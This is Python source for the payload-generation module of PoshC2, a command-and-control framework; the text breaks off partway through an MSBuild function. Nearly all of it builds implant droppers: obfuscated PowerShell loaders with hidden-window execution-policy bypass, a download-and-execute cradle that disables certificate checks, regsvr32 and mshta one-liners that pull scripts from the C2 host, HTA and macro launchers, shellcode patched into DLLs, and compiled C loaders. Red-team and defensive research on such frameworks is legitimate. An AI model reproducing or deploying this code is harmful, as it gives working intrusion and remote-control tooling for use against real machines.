from io import StringIO
import gzip, base64, subprocess, os, hashlib, shutil, re
from enum import Enum

from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName
from poshc2.Colours import Colours
from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr, offsetFinder, get_first_url


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import get_url_by_id, get_default_url_id, select_item
else:
    from poshc2.server.database.DBSQLite import get_url_by_id, get_default_url_id, select_item


class PayloadType(Enum):
    Posh_v2 = 1
    Posh_v4 = 2
    PBind = 3
    Sharp = 4
    PBindSharp = 5


class Payloads(object):

    quickstart = None

    def __init__(self, KillDate, Key, Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory, URLID = None, ImplantType = "", PowerShellProxyCommand = "", PBindPipeName=DefaultPBindPipeName, PBindSecret=DefaultPBindSecret):        

        if not URLID:
            URLID = get_default_url_id()

        self.URLID = URLID
        urlDetails = get_url_by_id(self.URLID)
        self.KillDate = KillDate
        self.Key = Key
        self.QuickCommand = select_item("QuickCommand", "C2Server")
        self.FirstURL = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
        self.DomainFrontHeader = urlDetails[3]
        self.PayloadCommsHost = urlDetails[2]
        self.Proxyuser = urlDetails[4]
        self.Proxypass = urlDetails[5]
        self.Proxyurl = urlDetails[6]
        self.PowerShellProxyCommand = PowerShellProxyCommand
        self.ImplantType = ImplantType
        self.Insecure = Insecure
        self.UserAgent = UserAgent
        self.Referrer = Referrer
        self.ConnectURL = ConnectURL
        self.BaseDirectory = BaseDirectory
        self.PBindPipeName = PBindPipeName if PBindPipeName else DefaultPBindPipeName
        self.PBindSecret = PBindSecret if PBindSecret else DefaultPBindSecret
        self.BaseDirectory = BaseDirectory
        self.PSDropper = ""
        self.PyDropper = ""

        if os.path.exists("%saes.py" % PayloadsDirectory):
            content = open("%saes.py" % PayloadsDirectory, 'r').read()
            m = re.search('#KEY(.+?)#KEY', content)
            if m:
                keyfound = m.group(1)
            self.PyDropperHash = hashlib.sha512(content.encode("utf-8")).hexdigest()
            self.PyDropperKey = keyfound
        else:
            self.PyDropperKey = str(gen_key().decode("utf-8"))
            randomkey = self.PyDropperKey
            content = open("%saes.py" % PayloadTemplatesDirectory, 'r').read()
            aespy = str(content).replace("#REPLACEKEY#", "#KEY%s#KEY" % randomkey)
            filename = "%saes.py" % (self.BaseDirectory)
            output_file = open(filename, 'w')
            output_file.write(aespy)
            output_file.close()
            self.PyDropperHash = hashlib.sha512((aespy).encode('utf-8')).hexdigest()

        content = open("%sdropper.ps1" % PayloadTemplatesDirectory, 'r').read()
        self.PSDropper = str(content) \
            .replace("#REPLACEINSECURE#", self.Insecure) \
            .replace("#REPLACEHOSTPORT#", self.PayloadCommsHost) \
            .replace("#REPLACECONNECTURL#", (self.ConnectURL + self.ImplantType)) \
            .replace("#REPLACEIMPTYPE#", self.PayloadCommsHost) \
            .replace("#REPLACEKILLDATE#", self.KillDate) \
            .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
            .replace("#REPLACEPROXYPASS#", self.Proxypass) \
            .replace("#REPLACEPROXYURL#", self.Proxyurl) \
            .replace("#REPLACEPROXYCOMMAND#", self.PowerShellProxyCommand) \
            .replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader) \
            .replace("#REPLACECONNECT#", self.ConnectURL) \
            .replace("#REPLACEUSERAGENT#", self.UserAgent) \
            .replace("#REPLACEREFERER#", self.Referrer) \
            .replace("#REPLACEURLID#", str(self.URLID)) \
            .replace("#REPLACEKEY#", self.Key)


    def QuickstartLog(self, txt):
        if not self.quickstart:
            self.quickstart = ''
        print(Colours.GREEN + txt)
        self.quickstart += txt + '\n'


    def WriteQuickstart(self, path):
        with open(path, 'w') as f:
            f.write(self.quickstart + Colours.END)
            print("")
            print(Colours.END + 'Quickstart written to ' + path + Colours.GREEN)


    def CreateRawBase(self, full=False, name=""):
        out = StringIO()
        data = bytes(self.PSDropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")
        batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload
        if full:
            return batfile
        else:
            return base64.b64encode(b64gzip.encode('UTF-16LE')).decode("utf-8")


    def CreateRaw(self, name=""):
        self.QuickstartLog("Raw Payload written to: %s%spayload.txt" % (self.BaseDirectory, name))
        
        out = StringIO()
        data = bytes(self.PSDropper, 'utf-8')
        out = gzip.compress(data)
        gzipdata = base64.b64encode(out).decode("utf-8")
        b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
        
        output_file = open("%s%spayload.txt" % (self.BaseDirectory, name), 'w')
        output_file.write(self.PSDropper)
        output_file.close()

        self.QuickstartLog("Batch Payload written to: %s%spayload.bat" % (self.BaseDirectory, name))
        
        encodedPayload = base64.b64encode(b64gzip.encode('UTF-16LE'))
        batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % encodedPayload.decode("utf-8")
        
        output_file = open("%s%spayload.bat" % (self.BaseDirectory, name), 'w')
        output_file.write(batfile)
        output_file.close()

        if name == "":
            psuri = f"{self.FirstURL}/{self.QuickCommand}_rp"
            pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
            psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
            self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))


    def CreateDroppers(self, name=""):
        self.QuickstartLog("C# Dropper DLL written to: %s%sdropper_cs.dll" % (self.BaseDirectory, name))
        self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory, name))

        content = open("%sdropper.cs" % PayloadTemplatesDirectory, 'r').read()
        content = str(content) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEBASEURL#", self.PayloadCommsHost) \
            .replace("#REPLACESTARTURL#", (self.ConnectURL + "?c")) \
            .replace("#REPLACEKILLDATE#", self.KillDate) \
            .replace("#REPLACEDF#", self.DomainFrontHeader) \
            .replace("#REPLACEUSERAGENT#", self.UserAgent) \
            .replace("#REPLACEREFERER#", self.Referrer) \
            .replace("#REPLACEPROXYURL#", self.Proxyurl) \
            .replace("#REPLACEPROXYUSER#", self.Proxyuser) \
            .replace("#REPLACEPROXYPASSWORD#", self.Proxypass) \
            .replace("#REPLACEURLID#", str(self.URLID))
        
        output_file = open("%s%sdropper.cs" % (self.BaseDirectory, name), 'w')
        output_file.write(str(content))
        output_file.close()

        subprocess.check_output("mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name), shell=True)
        subprocess.check_output("mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -sdk:4 -warn:1" % (self.BaseDirectory, name, self.BaseDirectory, name), shell=True)

        # Create PBind Sharp DLL
        content = open("%spbind.cs" % PayloadTemplatesDirectory, 'r').read()
        content = str(content) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEPBINDPIPENAME#", self.PBindPipeName) \
            .replace("#REPLACEPBINDSECRET#", self.PBindSecret)

        output_file = open("%s%spbind.cs" % (self.BaseDirectory, name), 'w')
        output_file.write(str(content))
        output_file.close()

        self.QuickstartLog("C# PBind Dropper DLL written to: %s%spbind_cs.dll" % (self.BaseDirectory, name))
        subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.dll -target:library -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)

        self.QuickstartLog("C# PBind Dropper EXE written to: %s%spbind_cs.exe" % (self.BaseDirectory, name))
        subprocess.check_output("mono-csc %s%spbind.cs -out:%sPB.exe -target:exe -warn:1 -sdk:4" % (self.BaseDirectory, name, self.BaseDirectory), shell=True)

        os.rename("%sPB.exe" % (self.BaseDirectory), "%s%spbind_cs.exe" % (self.BaseDirectory, name))
        os.rename("%sPB.dll" % (self.BaseDirectory), "%s%spbind_cs.dll" % (self.BaseDirectory, name))


    def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
        filename = "%s%s" % (self.BaseDirectory, filename)
        output_file = open(filename, 'wb')
        output_file.write(base64.b64decode(dll))
        output_file.close()
        srcfilename = ""

        if payloadtype == PayloadType.Posh_v4 or payloadtype == PayloadType.Posh_v2:
            out = StringIO()
            data = bytes(self.PSDropper, 'utf-8')
            out = gzip.compress(data)
            gzipdata = base64.b64encode(out).decode("utf-8")
            b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
            payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
            patch = payload.decode("utf-8")
            patchlen = 8000 - len(patch)

        elif payloadtype == PayloadType.Sharp:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")
            with open(srcfilename, "rb") as b:
                dllbase64  = base64.b64encode(b.read()).decode("utf-8")
            patchlen = 32000 - len((dllbase64))
            patch = dllbase64 

        elif payloadtype == PayloadType.PBind:
            out = StringIO()
            with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
                pbind = f.read()
            pbind = str(pbind).replace("#REPLACEKEY#", self.Key)            
            data = bytes(pbind, 'utf-8')
            out = gzip.compress(data)
            gzipdata = base64.b64encode(out).decode("utf-8")
            b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
            payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
            patch = payload.decode("utf-8")
            patchlen = 8000 - len(patch)

        elif payloadtype == PayloadType.PBindSharp:
            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "pbind_cs.exe")
            with open(srcfilename, "rb") as b:
                dllbase64 = base64.b64encode(b.read()).decode("utf-8")
            patchlen = 32000 - len((dllbase64))
            patch = dllbase64 

        patch2 = ""
        patch2 = patch2.ljust(patchlen, '\x00')
        patch3 = "%s%s" % (patch, patch2)

        f = open(filename, "r+b")
        f.seek(offset)
        f.write(bytes(patch3, 'UTF-16LE'))
        f.close()

        self.QuickstartLog("Payload written to: %s" % (filename))


    def CreateDll(self, DestinationFile, ResourceFile, payloadtype, name=""):                
        with open(ResourceFile, 'r') as f:
            fileRead = f.read()
        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)


    def CreateShellcodeFile(self, DestinationFile, DestinationFileB64, ResourceFile, payloadtype, name=""):        
        with open(ResourceFile, 'r') as f:
            fileRead = f.read()
        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
        with open(f"{self.BaseDirectory}{DestinationFile}", 'rb') as binary:
            with open(f"{self.BaseDirectory}{DestinationFileB64}", 'wb') as b64:
                b64.write(base64.b64encode(binary.read()))


    def CreateDlls(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("C++ DLL that loads CLR v2.0.50727 or v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
        self.CreateDll(f"{name}Posh_v2_x86.dll", f"{PayloadTemplatesDirectory}Posh_v2_x86_dll.b64", PayloadType.Posh_v2, name)
        self.CreateDll(f"{name}Posh_v2_x64.dll", f"{PayloadTemplatesDirectory}Posh_v2_x64_dll.b64", PayloadType.Posh_v2,name)
        self.CreateDll(f"{name}Posh_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", PayloadType.Posh_v4, name)
        self.CreateDll(f"{name}Posh_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", PayloadType.Posh_v4, name)
        self.CreateDll(f"{name}Sharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.Sharp, name)
        self.CreateDll(f"{name}Sharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.Sharp, name)
        self.CreateDll(f"{name}PBind_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", PayloadType.PBind, name)
        self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", PayloadType.PBind, name)
        self.CreateDll(f"{name}PBindSharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", PayloadType.PBindSharp, name)
        self.CreateDll(f"{name}PBindSharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", PayloadType.PBindSharp, name)

    def CreateShellcode(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Shellcode that loads CLR v2.0.50727 or v4.0.30319" + Colours.GREEN)
        self.CreateShellcodeFile(f"{name}Posh_v2_x86_Shellcode.bin", f"{name}Posh_v2_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v2_x86_Shellcode.b64", PayloadType.Posh_v2, name)
        self.CreateShellcodeFile(f"{name}Posh_v2_x64_Shellcode.bin", f"{name}Posh_v2_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v2_x64_Shellcode.b64", PayloadType.Posh_v2, name)
        self.CreateShellcodeFile(f"{name}Posh_v4_x86_Shellcode.bin", f"{name}Posh_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", PayloadType.Posh_v4, name)
        self.CreateShellcodeFile(f"{name}Posh_v4_x64_Shellcode.bin", f"{name}Posh_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", PayloadType.Posh_v4, name)
        self.CreateShellcodeFile(f"{name}Sharp_v4_x86_Shellcode.bin", f"{name}Sharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.Sharp, name)
        self.CreateShellcodeFile(f"{name}Sharp_v4_x64_Shellcode.bin", f"{name}Sharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.Sharp, name)
        self.CreateShellcodeFile(f"{name}PBind_v4_x86_Shellcode.bin", f"{name}PBind_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", PayloadType.PBind, name)
        self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", PayloadType.PBind, name)
        self.CreateShellcodeFile(f"{name}PBindSharp_v4_x86_Shellcode.bin", f"{name}PBindSharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", PayloadType.PBindSharp, name)
        self.CreateShellcodeFile(f"{name}PBindSharp_v4_x64_Shellcode.bin", f"{name}PBindSharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", PayloadType.PBindSharp, name)

    def CreateSCT(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % f"{self.FirstURL}/{self.QuickCommand}_rg" )
        content = open("%s%sdropper_cs.sct" % (PayloadTemplatesDirectory, name), 'r').read()
        content = str(content) \
            .replace("#REPLACEME#", self.CreateRawBase())
        output_file = open("%s%srg_sct.xml" % (self.BaseDirectory, name), 'w')
        output_file.write(content)
        output_file.close()

        self.QuickstartLog(Colours.END)
        self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % f"{self.FirstURL}/{self.QuickCommand}_cs")     
        content = open("%s%sdropper_cs.sct" % (PayloadTemplatesDirectory, name), 'r').read()
        content = str(content) \
            .replace("#REPLACEME#", self.CreateRawBase())
        output_file = open("%s%scs_sct.xml" % (self.BaseDirectory, name), 'w')
        output_file.write(content)
        output_file.close()


    def CreateHTA(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("HTA Payload written to: %sLauncher.hta" % self.BaseDirectory)
        
        basefile = self.CreateRawBase(full=True)
        hta = open("%s%sdropper.hta" % (PayloadTemplatesDirectory, name), 'r').read()
        hta = str(hta) \
            .replace("#REPLACEME#", basefile)
        output_file = open("%s%sLauncher.hta" % (self.BaseDirectory, name), 'w')
        output_file.write(hta)
        output_file.close()


    def CreateCS(self, name=""):
        self.QuickstartLog("C# Powershell v2 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
        self.QuickstartLog("C# Powershell v4 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))

        content = open("%sSharp_Powershell_Runner.cs" % PayloadTemplatesDirectory, 'r').read()
        content = content.replace("#REPLACEME#", str(self.CreateRawBase()))
        filename = "%s%sSharp_Posh_Stager.cs" % (self.BaseDirectory, name)
        output_file = open(filename, 'w')
        output_file.write(content)
        output_file.close()

        subprocess.check_output("mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v2.exe -target:exe -sdk:2 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)
        subprocess.check_output("mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps_v4.exe -target:exe -sdk:4 -warn:1 /reference:%sSystem.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, PayloadTemplatesDirectory), shell=True)        


    def CreateDotNet2JS(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("DotNet2JS Payloads:")
        
        for Payload in PayloadType:
            self.CreateDotNet2JSFiles(Payload, name)


    def CreateDotNet2JSFiles(self, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_DotNet2JS.js" % (self.BaseDirectory, name, payloadtype))
        dotnet = open("%sDotNet2JS.js" % PayloadTemplatesDirectory, 'r').read()  

        if payloadtype == PayloadType.Posh_v2:
            v4_64 = open('%s%sPosh_v2_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            v4_86 = open('%s%sPosh_v2_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            payloadname = "Posh_v2"
        elif payloadtype == PayloadType.Posh_v4:
            v4_64 = open('%s%sPosh_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            v4_86 = open('%s%sPosh_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            payloadname = "Posh_v4"
        elif payloadtype == PayloadType.Sharp:
            v4_64 = open('%s%sSharp_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            v4_86 = open('%s%sSharp_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            payloadname = "Sharp_v4"
        elif payloadtype == PayloadType.PBind:
            v4_64 = open('%s%sPBind_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            v4_86 = open('%s%sPBind_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            payloadname = "PBind_v4"
        elif payloadtype == PayloadType.PBindSharp:  
            v4_64 = open('%s%sPBindSharp_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            v4_86 = open('%s%sPBindSharp_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb').read()
            payloadname = "PBindSharp_v4"

        dotnet = dotnet \
            .replace("#REPLACEME32#", v4_86.decode('utf-8'))  \
            .replace("#REPLACEME64#", v4_64.decode('utf-8'))  

        filename = "%s%s%s_DotNet2JS.js" % (self.BaseDirectory, payloadname, name)
        output_file = open(filename, 'w')
        output_file.write(dotnet)
        output_file.close()  

        filename = "%s%s%s_DotNet2JS.b64" % (self.BaseDirectory, payloadname, name)
        output_file = open(filename, 'w')
        output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
        output_file.close()        


    def CreatePython(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Python2 OSX/Unix/Win Dropper written to: %spy_dropper.sh" % self.BaseDirectory)
        
        # get the python dropper template
        dropper_file = open("%sdropper.py" % PayloadTemplatesDirectory,'r').read()

        # patch the key settings into the file
        self.PyDropper = str(dropper_file) \
            .replace("#REPLACEKILLDATE#", self.KillDate) \
            .replace("#REPLACEPYTHONHASH#", self.PyDropperHash) \
            .replace("#REPLACESPYTHONKEY#", self.PyDropperKey) \
            .replace("#REPLACEKEY#", self.Key) \
            .replace("#REPLACEHOSTPORT#", self.PayloadCommsHost) \
            .replace("#REPLACEQUICKCOMMAND#", "/" + self.QuickCommand + "_py") \
            .replace("#REPLACECONNECTURL#", self.ConnectURL + "?m") \
            .replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader) \
            .replace("#REPLACEURLID#", str(self.URLID)) \
            .replace("#REPLACEUSERAGENT#", self.UserAgent)

        py = base64.b64encode(self.PyDropper.encode('UTF-8'))
        pydropper = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python2 &" % (py).decode('UTF-8')
        output_file = open("%s%spy_dropper.sh" % (self.BaseDirectory, name), 'w')
        output_file.write(pydropper)
        output_file.close()
        
        pydropper = "import sys,base64;exec(base64.b64decode('%s'));" % py.decode('UTF-8')
        output_file = open("%s%spy_dropper.py" % (self.BaseDirectory, name), 'w')
        output_file.write(pydropper)
        output_file.close()


    def CreateEXE(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Executable files:")

        for cfile in os.listdir(PayloadTemplatesDirectory):
            if cfile.endswith(".c"):
                for Payload in PayloadType:
                    self.CreateEXEFiles(cfile, Payload, name)
                

    def CreateEXEFiles(self, sourcefile, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_%s64.exe" % (self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")))
        self.QuickstartLog("Payload written to: %s%s%s_%s32.exe" % (self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")))

        # Get the first URL and the default migration process from the config
        migrate_process = DefaultMigrationProcess
        if "\\" in migrate_process and "\\\\" not in migrate_process:
            migrate_process = migrate_process.replace("\\", "\\\\")

        if payloadtype == PayloadType.Posh_v2:
            # Get the Posh shellcode 
            shellcodesrc = open("%s%sPosh_v2_x86_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            shellcodesrc = open("%s%sPosh_v2_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)
            payloadname = "Posh_v2"

        elif payloadtype == PayloadType.Posh_v4:
            # Get the Posh shellcode 
            shellcodesrc = open("%s%sPosh_v4_x86_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            shellcodesrc = open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)
            payloadname = "Posh_v4"

        elif payloadtype == PayloadType.Sharp:
            # Get the Sharp shellcode 
            shellcodesrc = open("%s%sSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            shellcodesrc = open("%s%sSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)
            payloadname = "Sharp_v4"

        elif payloadtype == PayloadType.PBind:
            # Get the Posh shellcode 
            shellcodesrc = open("%s%sPBind_v4_x86_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            shellcodesrc = open("%s%sPBind_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)
            payloadname = "PBind_v4"

        elif payloadtype == PayloadType.PBindSharp:
            # Get the Sharp shellcode 
            shellcodesrc = open("%s%sPBindSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode32 = formStr("char sc[]", hexcode)
            shellcodesrc = open("%s%sPBindSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name),'rb').read()
            hexcode = "".join("\\x{:02x}".format(c) for c in shellcodesrc)
            shellcode64 = formStr("char sc[]", hexcode)
            payloadname = "PBindSharp_v4"

        # Create the raw C file from the template
        content = open("%s%s" % (PayloadTemplatesDirectory, sourcefile), 'r').read()
        content = str(content) \
            .replace("#REPLACEME#", str(shellcode64)) \
            .replace("#REPLACEMEPROCESS#", migrate_process)
        output_file = open("%s%s%s_%s64.c" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c","")), 'w')
        output_file.write(content)
        output_file.close()

        # Create the raw C file from the template
        content = open("%s%s" % (PayloadTemplatesDirectory, sourcefile), 'r').read()
        content = str(content) \
            .replace("#REPLACEME#", str(shellcode32)) \
            .replace("#REPLACEMEPROCESS#", migrate_process)
        output_file = open("%s%s%s_%s32.c" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c","")), 'w')
        output_file.write(content)
        output_file.close()

        # Compile the exe
        subprocess.check_output("x86_64-w64-mingw32-gcc -w %s%s%s_%s64.c -o %s%s%s_%s64.exe" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")), shell=True)
        subprocess.check_output("i686-w64-mingw32-gcc -w %s%s%s_%s32.c -o %s%s%s_%s32.exe" % (self.BaseDirectory, name, payloadname, sourcefile.replace(".c",""), self.BaseDirectory, name, payloadtype, sourcefile.replace(".c","")), shell=True)


    def CreateMacro(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Macro Payload written to: %s%smacro.txt" % (self.BaseDirectory, name))

        strmacro = formStrMacro("str", str( self.CreateRawBase() ))
        content = open("%sdropper.macro" % PayloadTemplatesDirectory, 'r').read()
        content = str(content) \
            .replace("#REPLACEME#",strmacro)

        output_file = open("%smacro.txt" % (self.BaseDirectory), 'w')
        output_file.write(content)
        output_file.close()


    def CreateMsbuild(self, name=""):
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Msbuild payload files")

        for Payload in PayloadType:
            self.CreateMsbuildFiles(Payload, name)
    

    def CreateCsc(self, name=""):    
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("CSC payload files")

        for Payload in PayloadType:
            self.CreateCSCFiles(Payload, name)


    def CreateMsbuildFiles(self, payloadtype, name=""):
        self.QuickstartLog("Payload written to: %s%s%s_msbuild.xml" % (self.BaseDirectory, name, payloadtype))
        
        if payloadtype == PayloadType.Posh_v2:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v2_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "Posh_v2"

        elif payloadtype == PayloadType.Posh_v4:
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "Posh_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "Posh_v4"

        elif payloadtype == PayloadType.Sharp:
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "Sharp_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "Sharp_v4"

        elif payloadtype == PayloadType.PBind:
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x86_Shellcode.bin"), "rb") as b86:
                x86base64 = base64.b64encode(b86.read())
            with open("%s%s" % (self.BaseDirectory, name + "PBind_v4_x64_Shellcode.bin"), "rb") as b64:
                x64base64 = base64.b64encode(b64.read())
            payloadname = "PBind_v4"

        elif payloadtype == PayloadType.PBindSharp:
